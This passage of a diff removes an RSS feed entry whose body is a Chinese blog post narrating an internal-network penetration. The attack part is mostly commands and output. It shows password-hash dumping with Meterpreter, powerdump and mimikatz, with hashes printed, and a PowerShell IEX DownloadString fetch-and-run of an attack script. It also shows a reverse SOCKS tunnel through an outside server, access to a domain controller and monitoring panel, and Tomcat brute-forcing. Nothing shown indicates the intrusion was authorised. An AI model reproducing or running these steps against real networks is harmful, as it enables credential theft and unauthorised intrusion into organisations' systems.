-/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
-/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
-/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
-[*] Dumping password hints...
-
-No users with password hints on this system
-
-[*] Dumping password hashes...
-
-
-Administrator:500:aad3b4***b51404ee:a4b09576473b6a35e456ed407a98e334:::
-Guest:501:aad3b435b5140***404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-ftpuser:1000:aad3b435b51****ee:2280c4ddb554cdcdc62c72c291f2810a:::
-patrol:1002:aad3b435b51****78ab2d769fda7de045a3622a62ea:::
-neuadmin:1005:aad3b435***404ee:345b3b0faf52aea5200da1cf8d1323a0:::
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;run powerdump&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run powerdump 
-[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
-[*] Running PowerDump to extract Username and Password Hashes...
-[*] Uploaded PowerDump as 53805.ps1 to %TEMP%...
-[*] Setting ExecutionPolicy to Unrestricted...
-[*] Dumping the SAM database through PowerShell...
-??Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-ftpuser:1000:aad3b435b51404eeaad3b435b51404ee:2280c4ddb554cdcdc62c72c291f2810a:::
-patrol:1002:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
-neuadmin:1005:aad3b435b51404eeaad3b435b51404ee:345b3b0faf52aea5200da1cf8d1323a0:::
-allen:1007:aad3b435b51404eeaad3b435b51404ee:53a6281e41664275dfbccd4d171e406f:::
-[*] Setting Execution policy back to Restricted...
-[*] Cleaning up after ourselves...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;load mimikatz
-kerberos&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load mimikatz 
-Loading extension mimikatz...
-[!] Loaded x86 Mimikatz on an x64 architecture.
-Success.
-meterpreter &amp;gt; kerberos 
-[+] Running as SYSTEM
-[*] Retrieving kerberos credentials
-kerberos credentials
-====================
-
-AuthID      Package    Domain        User           Password
-------      -------    ------        ----           --------
-******      *******    ******        ****           ********
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;run post/windows/gather/smart_hashdump&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/smart_hashdump
-
-[*] Running module against ZXKF3
-[*] Hashes will be saved to the database if one is connected.
-[+] Hashes will be saved in loot in JtR password file format to:
-[*] /Users/liyingzhe/.msf4/loot/20171228143129_default_10.159.191.178_windows.hashes_440460.txt
-[*] Dumping password hashes...
-[*] Running as SYSTEM extracting hashes from registry
-[*] 	Obtaining the boot key...
-[*] 	Calculating the hboot key using SYSKEY 699b2df6ee97132bcad5b2f9efdc738e...
-[*] 	Obtaining the user list and keys...
-[*] 	Decrypting user keys...
-[*] 	Dumping password hints...
-[*] 	No users with password hints on this system
-[*] 	Dumping password hashes...
-[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
-[+] 	ftpuser:1000:aad3b435b51404eeaad3b435b51404ee:2280c4ddb554cdcdc62c72c291f2810a:::
-[+] 	patrol:1002:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
-[+] 	neuadmin:1005:aad3b435b51404eeaad3b435b51404ee:345b3b0faf52aea5200da1cf8d1323a0:::
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x06-powershell技巧&quot;&gt;0x06 PowerShell技巧&lt;/h2&gt;
-
-&lt;h3 id=&quot;外部powershell脚本&quot;&gt;外部Powershell脚本&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Powersploit https://github.com/PowerShellMafia/PowerSploit&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;第一种办法（推荐）：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load powershell 
-Loading extension powershell...Success.
-meterpreter &amp;gt; powershell_shell
-PS &amp;gt; whoami
-nt authority\system
-PS &amp;gt; IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&quot;);
-PS &amp;gt; Invoke-Portscan -Hosts 10.159.63.2 -Ports &quot;21&quot;
-
-
-Hostname      : 10.159.63.2
-alive         : True
-openPorts     : {21}
-closedPorts   : {}
-filteredPorts : {}
-finishTime    : 2017/12/28 17:19:46
-
-.....
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;第二种办法：(先通过其他模块下载)&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1
-
-[*] 41534 bytes downloaded to C:\Windows\TEMP\Invoke-Portscan.ps1 in 1 seconds 
-meterpreter &amp;gt; powershell_shell 
-PS &amp;gt; C:\Windows\TEMP\Invoke-Portscan.ps1
-PS &amp;gt; Invoke-Portscan -Hosts 10.159.63.5 -Ports &quot;22&quot;
-
-
-Hostname      : 10.159.63.5
-alive         : True
-openPorts     : {22}
-closedPorts   : {}
-filteredPorts : {}
-finishTime    : 2017/12/28 17:23:45
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x07-再一次克服困难&quot;&gt;0x07 再一次克服困难&lt;/h2&gt;
-
-&lt;p&gt;之前的方案是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Portfwd&lt;/code&gt;，但是效果太差了，当数据流过大，会将Meterpreter冲掉，并且每次数据回送都不完整。&lt;/p&gt;
-
-&lt;p&gt;这次采用Socks5打洞，我利用了外网的服务器，开设一个Socks代理端口，将流量转发到目标内网&lt;/p&gt;
-
-&lt;p&gt;外网服务器：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@iZm5e***1ga7bq07Z:~# ./ew_for_linux64 -s rcsocks -l 1080 -e 888 &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;内网主机：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ew_for_Win.exe -s rssocks -d [服务器IP] -e 888
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;ew下载地址： http://rootkiter.com/EarthWorm/&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;现在在浏览器中设置一下Socks5代理即可访问内网，很稳定&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x002.png&quot; alt=&quot;设置代理&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x001.png&quot; alt=&quot;打洞成功&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x08-开始扫描&quot;&gt;0x08 开始扫描&lt;/h2&gt;
-
-&lt;p&gt;一开始我使用PowerSploit扫描，但是需要等待Meterpreter将数据取回，这样就占用了一个session，搜集了部分信息后，决定采用Nmap&lt;/p&gt;
-
-&lt;p&gt;由于我的操作系统是黑苹果，需要安装proxychains-ng&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install proxychains-ng
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;程序安装在：&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/Cellar/proxychains-ng/4.12_1/bin/proxychains4&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;配置文件：&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/etc/proxychains.conf&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;添加一条Socks5代理：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#Examples:
-#
-#       socks5  192.168.67.78   1080    lamer   secret
-#       http    192.168.89.3    8080    justu   hidden
-#       socks4  192.168.1.49    1080
-#       http    192.168.39.93   8080  
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to &quot;tor&quot;
-socks5  ***.***.***.*** 1080
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;开始扫描：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x003.png&quot; alt=&quot;扫描&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x09-信息搜集基本结果&quot;&gt;0x09 信息搜集基本结果&lt;/h2&gt;
-
-&lt;p&gt;通过端口扫描以及HTTP服务的爬行，发现一些运维人员开放的共享，和一些MS17010漏洞的Windows服务器，但是没有选择直接去打，觉得信息搜集的不够全面&lt;/p&gt;
-
-&lt;p&gt;在内网中收获最大的就是搜集到了运维人员用于共享系统镜像、工具的Web服务器：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x004.png&quot; alt=&quot;运维人员的服务器&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;发现基线检查的文档，下载了一两个，开始通过搜集的信息进行内网结构画像：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x006.png&quot; alt=&quot;基线检查&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x005.png&quot; alt=&quot;内网结构&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;轻松获得域控服务器&quot;&gt;轻松获得域控服务器&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x007.png&quot; alt=&quot;域控&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;从文档中搜集信息如下：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;密码：*****@*****! *****
-
-administrator密码：***** # 后面尝试了登录这个，不行
-IP地址：10.159.16.2
-掩码：255.255.255.128
-网关：10.159.16.1
-域名称：*****.com
-域用户：***** 、 *****密码*****
-
-计算机名：
-所在域名或工作组名称：*****.com
-IP地址：10.159.16.2
-掩码：255.255.255.128
-网关：10.159.16.1
-操作系统：Windows Server2008 R2企业版
-服务器1—群集节点A
-计算机名：nascluster1
-所在域名或工作组名称：*****.com
-IP地址1：10.159.16.3
-IP地址2：192.168.10.3
-操作系统：Windows Server 2012
-服务器2—群集节点B
-计算机名：nascluster2
-所在域名或工作组名称：*****.com
-IP地址1：10.159.16.4
-IP地址2：192.168.10.4
-操作系统：Windows Server 2012
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;根据之前搜集的子网来判断，我们所处于的内网中有很多域。并且能够可以和域控服务器通信，即使当前的服务器不在域中，也可以进行登录&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x008.png&quot; alt=&quot;域控3389&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;通过两层转发，我们尝试登录：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;一层是公司路由&lt;/li&gt;
-  &lt;li&gt;一层是LCX&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x009.jpg&quot; alt=&quot;登录域控&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当时登录上去并没有做过多的操作，简单看看就下来了，因为这个内网很大，后面的发现令我倒吸凉气&lt;/p&gt;
-
-&lt;h2 id=&quot;0x10-内网核心&quot;&gt;0x10 内网核心&lt;/h2&gt;
-
-&lt;p&gt;Orion&lt;/p&gt;
-
-&lt;p&gt;这是一款完善的网络带宽、性能和故障管理软件。使用它用户可以通过自己的浏览器即时监控自己的网络状态和统计资料。程序将监视和搜集来自路由、节点、服务器和所有开启SNMP服务的设备信息；同时也将监控本机的CPU占用率、内存使用情况以及可用磁盘空间。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0010.png&quot; alt=&quot;Orion&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;通过空口令进入&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0011.png&quot; alt=&quot;Orion&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;通过查看别名发现这些设备是企业的核心路由、防火墙、交换机&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;官网防火墙&lt;/li&gt;
-  &lt;li&gt;管理员交换机（专线）&lt;/li&gt;
-  &lt;li&gt;内网核心交换机 x 2&lt;/li&gt;
-  &lt;li&gt;外网核心交换机 x 2&lt;/li&gt;
-  &lt;li&gt;公网接入交换机 x 2&lt;/li&gt;
-  &lt;li&gt;回源 （这个不太清楚）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;基本上都是50个口以上&lt;/p&gt;
-
-&lt;p&gt;通过之前的自动搜集的路由来看：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
-[*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
-[*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;10.0.0.0 是可以访问整个超大的内网，在搜集其他网段信息的时候，不泛发现其他大企业的漏洞、大多是配置不得当。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x12-配置引发的隐患&quot;&gt;0x12 配置引发的隐患&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0012.png&quot; alt=&quot;一些配置文件&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0013.png&quot; alt=&quot;一些配置文件&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;还有未做权限验证的Docker集群管理平台：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0014.png&quot; alt=&quot;Docker&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;有多个实例，分别用于对外的服务&lt;/p&gt;
-
-&lt;p&gt;搜集到用户中心的数据库配置，也就是说泄漏了所有用户的数据了，这可是一个大厂。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0015.png&quot; alt=&quot;数据库&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;其次一些网段基本上都安装了&lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat&lt;/code&gt;，通过socks5代理，进行爆破，流量不走Meterpreter，因为会掉线&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf auxiliary(tomcat_mgr_login) &amp;gt; show options 
-
-Module options (auxiliary/scanner/http/tomcat_mgr_login):
-
-   Name              Current Setting                                                                              Required  Description
-   ----              ---------------                                                                              --------  -----------
-   BLANK_PASSWORDS   false                                                                                        no        Try blank passwords for all users
-   BRUTEFORCE_SPEED  5                                                                                            yes       How fast to bruteforce, from 0 to 5
-   DB_ALL_CREDS      false                                                                                        no        Try each user/password couple stored in the current database
-   DB_ALL_PASS       false                                                                                        no        Add all passwords in the current database to the list
-   DB_ALL_USERS      false                                                                                        no        Add all users in the current database to the list
-   PASSWORD                                                                                                       no        The HTTP password to specify for authentication
-   PASS_FILE         /Volumes/OSXData/Pentester/Dict/100.txt                                                      no        File containing passwords, one per line
-   Proxies           socks5:***.***.***.***:1080                                                                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS            10.159.63.70-133                                                                             yes       The target address range or CIDR identifier
-   RPORT             8080                                                                                         yes       The target port (TCP)
-   SSL               false                                                                                        no        Negotiate SSL/TLS for outgoing connections
-   STOP_ON_SUCCESS   false                                                                                        yes       Stop guessing when a credential works for a host
-   TARGETURI         /manager/html                                                                                yes       URI for Manager login. Default is /manager/html
-   THREADS           10                                                                                           yes       The number of concurrent threads
-   USERNAME                                                                                                       no        The HTTP username to specify for authentication
-   USERPASS_FILE     /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
-   USER_AS_PASS      false                                                                                        no        Try the username as the password for all users
-   USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
-   VERBOSE           true                                                                                         yes       Whether to print output for all attempts
-   VHOST                                                                                                          no        HTTP server virtual host
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0017.png&quot; alt=&quot;tomcat爆破&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如我所料，没有一个成功的，也发现了一些SSH端口，但是会把流量升高，触发一些警报，就没有再尝试这种爆破手法了。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x13-需要搜集的信息&quot;&gt;0x13 需要搜集的信息&lt;/h2&gt;
-
-&lt;p&gt;搜集的信息列出来，就不贴了：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;服务器当前所在网段的所有主机端口&lt;/li&gt;
-  &lt;li&gt;服务器ARP缓存&lt;/li&gt;
-  &lt;li&gt;服务器上的服务&lt;/li&gt;
-  &lt;li&gt;内网中其他HTTP服务&lt;/li&gt;
-  &lt;li&gt;满足容易利用的漏洞端口 （MS17010 / 445）&lt;/li&gt;
-  &lt;li&gt;抓包嗅探还是很有必要的  （千万不要ARP %@#@@651#@^#@@#@@###@@!）&lt;/li&gt;
-  &lt;li&gt;共享文件&lt;/li&gt;
-  &lt;li&gt;密码&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;0x14-总结&quot;&gt;0x14 总结&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;在行动之前思考几分钟，有没有更好的办法&lt;/li&gt;
-  &lt;li&gt;思考一个问题多个解决方案的利弊&lt;/li&gt;
-  &lt;li&gt;尽量快速熟悉网络环境 -&amp;gt; [前提是你已经熟悉了服务器环境]&lt;/li&gt;
-  &lt;li&gt;对日志要时刻保持敏感&lt;/li&gt;
-  &lt;li&gt;看子网掩码、计算子网大小，判断有没有VLAN&lt;/li&gt;
-  &lt;li&gt;选取自己熟悉的协议进行信息搜集&lt;/li&gt;
-  &lt;li&gt;网络命令一定要熟&lt;/li&gt;
-  &lt;li&gt;对于后门要加强维护&lt;/li&gt;
-  &lt;li&gt;你必须保证你花费98%的时间都在了解他们&lt;/li&gt;
-  &lt;li&gt;学习使用Powershell和熟练掌握端口转发&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-        <pubDate>Thu, 28 Dec 2017 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/archivers/2017-12-28/1</link>
-        <guid isPermaLink="true">http://localhost:4000/archivers/2017-12-28/1</guid>
-        
-        
-        <category>内网渗透</category>
         
       </item>
     
